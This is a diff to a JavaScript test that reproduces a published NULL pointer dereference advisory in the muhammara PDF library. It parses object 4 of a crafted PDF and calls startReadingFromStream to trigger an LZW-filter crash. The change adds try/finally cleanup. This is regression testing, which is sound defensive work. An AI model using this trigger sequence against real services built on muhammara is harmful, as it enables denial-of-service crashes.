@@ -119,14 +119,16 @@ describe("Testing muhammara NULL Pointer Dereference PoC (GHSA-fhp4-pr5j-46m5)",
     // Verify PDF parses successfully (to confirm valid structure)
     const reader = muhammara.createReader(TARGET);
 
-    // Retrieve stream object (obj 4)
-    const streamObj = reader.parseNewObject(4);
+    try {
+      // Retrieve stream object (obj 4)
+      const streamObj = reader.parseNewObject(4);
 
-    // Trigger: startReadingFromStream applies LZW filter
-    // → CreateFilterForStream → earlyObj->GetValue() on NULL → ACCESS VIOLATION
-    reader.startReadingFromStream(streamObj);
-
-    // If execution reaches here, the bug was not triggered
-    fs.unlinkSync(TARGET);
+      // Trigger: startReadingFromStream applies LZW filter
+      // → CreateFilterForStream → earlyObj->GetValue() on NULL → ACCESS VIOLATION
+      reader.startReadingFromStream(streamObj);
+    } finally {
+      reader.end();
+      fs.unlinkSync(TARGET);
+    }
   });
 });
